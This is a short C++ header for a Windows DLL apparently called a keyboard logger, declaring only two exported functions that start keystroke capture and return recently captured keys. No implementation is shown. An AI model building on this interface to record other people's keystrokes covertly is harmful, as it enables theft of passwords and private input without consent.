#pragma once

#ifndef KEYBOARD_LOGGER_H
#define KEYBOARD_LOGGER_H

#ifdef KEYBOARD_LOGGER_EXPORTS
#define KEYBOARD_LOGGER_API __declspec(dllexport)
#else
#define KEYBOARD_LOGGER_API __declspec(dllimport)
#endif

#include <vector>

extern "C" KEYBOARD_LOGGER_API void StartKeyboardLogger();
extern "C" KEYBOARD_LOGGER_API void GetLastKeys(char* buffer, int* size);

#endif